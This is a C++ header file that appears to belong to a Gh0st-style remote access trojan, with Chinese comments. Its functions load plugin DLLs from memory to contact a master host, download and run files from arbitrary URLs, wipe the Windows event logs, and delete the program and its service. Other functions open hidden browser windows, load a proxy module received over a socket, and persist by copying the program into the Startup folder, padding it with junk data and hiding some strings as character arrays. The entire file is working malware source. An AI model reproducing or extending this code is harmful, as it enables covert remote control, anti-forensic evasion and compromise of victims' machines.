#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "until.h"
#include <STDIO.H>
extern BOOL     bisUnInstall;

extern CHAR NtrServiceName[100];   //服务名称

#include "MemoryModule.h"


typedef BOOL (* PluginMe)(LPCTSTR strHost, UINT HostPort, LPBYTE lparam);

BOOL LoadFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{

	
	HMEMORYMODULE module;
	PluginMe myPluginMe;
	
	module = MemoryLoadLibrary(data);
	if (module == NULL)
	{
		goto exit;
	}
	
	myPluginMe = (PluginMe)MemoryGetProcAddress(module, "PluginMe");
	myPluginMe(lpszHost,nPort,lpBuffer);
	MemoryFreeLibrary(module);
	
exit:

	if (data)
		VirtualFree(data,0,MEM_RELEASE);
	
	return 1;
}

DWORD WINAPI Loop_Plugin(LPVOID lparam)
{
	LoadFromMemory(lparam,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,NULL);
	return 0;
}

DWORD WINAPI Loop_DoorPlugin(LPVOID lparam)
{
	LoadFromMemory(lparam,CKernelManager::m_strDoorMasterHost, CKernelManager::m_nDoorMasterPort,NULL);
	return 0;
}



// 关机
void ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

//卸载程序
extern HMODULE hDllModule;
void DeleteSelf()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];
	
	GetModuleFileName(hDllModule,strServiceDll,sizeof(strServiceDll));
	GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
	wsprintfA(strRandomFile, "%s\\%d.bak",strRandomFile, GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

//停止服务
BOOL NtStopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;
	
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
	if (schSCManager!=NULL)
	{
		schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
		if (schService!=NULL)
		{		
			if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//停止服务
				{
					if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							Sleep(10);
							QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			CloseServiceHandle(schService);
		}	
		CloseServiceHandle(schSCManager);
	}
	else 
	{
		return FALSE;
	}
	
	return TRUE;
}
//卸载服务
void NtUninstallService(LPCTSTR ServiceName)
{
	if (!lstrlen(ServiceName))
		return;
	
	NtStopService(ServiceName);
	
	SC_HANDLE scm,svc;
	
	scm=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			DeleteService(svc);
			CloseServiceHandle(svc);
		}
		CloseServiceHandle(scm);
	}
	
	WriteRegEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
		ServiceName,
		NULL,
		NULL,
		NULL,
		3);
}

void Rundll32Dll(const char* p = NULL)
{
	DeleteSelf();

	NtUninstallService(NtrServiceName);	 //卸载服务
	WriteRegEx(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services",NtrServiceName,NULL,NULL,NULL,2);//删除注册表信息
	
	OSVERSIONINFO OSversion;
	OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);
	
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion >= 6)
		{
			bisUnInstall = TRUE;
		}
	}
	ExitProcess(NULL);
}



DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = new char[nUrlLength + 1];
	memcpy(lpURL, lparam, nUrlLength + 1);
	lpFileName = strrchr(lpURL, '/') + 1;
		
	if (lpFileName == NULL||!http_get(lpURL, lpFileName) || !CheckFileExist(lpFileName))
	{
    	delete []lpURL;
		return false;
	}
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 
	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	delete []lpURL;
	return true;
}

//下载更新
BOOL UpdateServer(LPCTSTR lpURL)
{
	const char	*lpFileName = NULL;
	
	lpFileName = strrchr(lpURL, '/') + 1;
	
	if (lpFileName == NULL)
		return false;
	
	if (!http_get(lpURL, lpFileName,TRUE)||!CheckFileExist(lpFileName))
		return false;
	
	Rundll32Dll(lpFileName);
	
	return true;
}


// 打开网页
bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
	if (strlen(lpszURL) == 0)
		return false;
	
	// System 权限下不能直接利用shellexecute来执行
	char BvtmX02[] = {'A','p','p','l','i','c','a','t','i','o','n','s','\\','i','e','x','p','l','o','r','e','.','e','x','e','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d','\0'};
	char	*lpSubKey = BvtmX02;
	HKEY	hKey;
	char	strIEPath[MAX_PATH]={0};
	LONG	nSize = sizeof(strIEPath);
	char	*lpstrCat = NULL;
	
	//访问注册表 iexplore.exe 文件是否存在
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_READ, &hKey) != ERROR_SUCCESS)
		return false;
	
	RegQueryValue(hKey, NULL, strIEPath, &nSize);
	RegCloseKey(hKey);
	
	if (lstrlen(strIEPath) == 0)
		return false;
	
	char ZYPYd10[] = {'%','1','\0'};
	lpstrCat = strstr(strIEPath, ZYPYd10);
	if (lpstrCat == NULL)
		return false;
	
	lstrcpy(lpstrCat, lpszURL);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char BvtmX01[] = {'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = BvtmX01; 
	
	CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return 0;
}

//显示打开网页
DWORD WINAPI Loop_OpenURLSHOW(LPBYTE sRemote)
{
	OutputDebugString("显示打开");
	OpenURL((LPCTSTR)sRemote,SW_SHOWNORMAL);
	
	return 0;
}
//隐藏打开网页
DWORD WINAPI Loop_OpenURLHIDE(LPBYTE sRemote)
{
	OpenURL((LPCTSTR)sRemote,SW_HIDE);
	
	return 0;
}

//清除日志
void CleanEvent(BYTE bType)
{
	char *strEventName[] = {"Application", "Security", "System"};
	switch(bType)
	{
	case CLEAN_EVENT_ALL:
		break;
	case CLEAN_EVENT_APP:
		strEventName[1] = "";
		strEventName[2] = "";
		break;
	case CLEAN_EVENT_SEC:
		strEventName[0] = "";
		strEventName[2] = "";
		break;
	case CLEAN_EVENT_SYS:
		strEventName[0] = "";
		strEventName[1] = "";
		break;
	default:
		return;
	}
	
	for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
	{
		
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

//修改备注 或分组 bUpGroup == FALSE 为修改备注 TRUE 为修改分组
void SetHostID(LPCTSTR lpBuffer)
{
	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);


	WriteRegEx(HKEY_LOCAL_MACHINE, 
		strSubKey, 
		"Remark", 
		REG_SZ, 
		(char*)lpBuffer, 
		strlen(lpBuffer), 
		1);			
}
//修改备注 或分组 bUpGroup == FALSE 为修改备注 TRUE 为修改分组
void SetGroup(LPCTSTR lpBuffer)
{
	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);

	WriteRegEx(HKEY_LOCAL_MACHINE, 
		strSubKey, 
		"Group", 
		REG_SZ, 
		(char*)lpBuffer, 
		strlen(lpBuffer), 
		1);			
}
void WINAPI Loop_MsgBox(LPVOID lParam)
{
	//发送消息
	struct MSGBOX
	{
		CHAR Title[200];
		CHAR szText[1000];
		UINT Type;
	}MsgBox;
	
	memcpy(&MsgBox,lParam,sizeof(MSGBOX));
	MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);
} 

typedef BOOL (* OpenProxy)(LPVOID lparam);
typedef BOOL (* CloseProxy)();
char bToken[99];

HMEMORYMODULE hmProxy = NULL;
BOOL WINAPI Loop_Proxy(CClientSocket * m_pClient)
{	
	if ( hmProxy!= NULL)
	{
		return FALSE;
	}
	
	LPBYTE lpBuffer = m_pClient->m_DeCompressionBuffer.GetBuffer(1);
	UINT nSize = m_pClient->m_DeCompressionBuffer.GetBufferLen() - 1;
	
	memset(bToken,0,sizeof(bToken));
	memcpy(bToken,lpBuffer,99);
	
	nSize -= 99;
	
	LPBYTE data = new BYTE[nSize];
	memcpy(data,lpBuffer + 99,nSize );
	
	hmProxy = MemoryLoadLibrary(data);
	if (hmProxy == NULL)
	{
		goto exit;
	}
	
	OpenProxy myOpenProxy;
	myOpenProxy = (OpenProxy)MemoryGetProcAddress(hmProxy, "OpenProxy");
	myOpenProxy(bToken);
	MemoryFreeLibrary(hmProxy);
	
exit:
	if (data)
		delete [] data;
	
	hmProxy = NULL;
	return 0;
}

//结构体
struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //文件属性	
	WORD Enlarge;            //安装增大
}Start;

///////////////////////////////////////////////////////////////////////////////////
VOID Wj_OnButtonAdd(LPSTR Path)  //文件加大函数  Path 文件名
{
	HMODULE hDll;
	hDll = LoadLibrary("KERNEL32.dll");
	if(Start.Enlarge == 0)  //安装不增大
		return ;
	
	
	int m_Size=Start.Enlarge;  //m_Size=10 就是10M
	DWORD dwSize = m_Size * 1024;
	DWORD iSize; 
	
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	if(hFile==INVALID_HANDLE_VALUE)  //失败
		return;
	
	
	SetFilePointer(hFile,0,NULL,FILE_END);
    iSize = GetFileSize(hFile,NULL);  
	if((dwSize*1024)>iSize)  //判断文件是否过大 防止服务端程序多次点击运行
	{  
		
		DWORD dwBytes=NULL;
		CHAR Buffer[1024]={NULL};
		for (DWORD n=0;n<dwSize;n++)
		{
			if(n%1024==0){
				for (int x=0;x<1024;x++)
					Buffer[x]=(char)(rand()+x)%255;    //写入随机垃圾数据
			}
			
			WriteFile(hFile,Buffer,1024,&dwBytes,NULL);
		}
	}
	CloseHandle(hFile);	
}
#include <sHLOBJ.H>
void WINAPI Loop_Start(LPVOID lParam)
{
	memcpy(&Start,lParam,sizeof(START));
	////获取小马路径
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
	TCHAR   szPath[MAX_PATH];
	if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
	{
		return ;
	}
	char FileName[80];
	
	wsprintf(FileName,"%s.exe",Start.Startname);
	
	TCHAR buf[MAX_PATH], buf2[MAX_PATH];
	wsprintf(buf, "%s\\%s", szPath, FileName);

	if (GetFileAttributes(buf) == -1)
	{
		wsprintf(buf2, "%s\\%s", szPath, FileName);
		Sleep(100);
		CopyFile(strInstallModule,buf2,FALSE);//拷贝自身文件
		MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		CreateDirectory(szPath, NULL);
		Wj_OnButtonAdd(buf2);  //文件增大
		SetFileAttributes(buf2,Start.FileAttribute);
	}
} 
#endif // !defined(AFX_LOOP_H_INCLUDED)
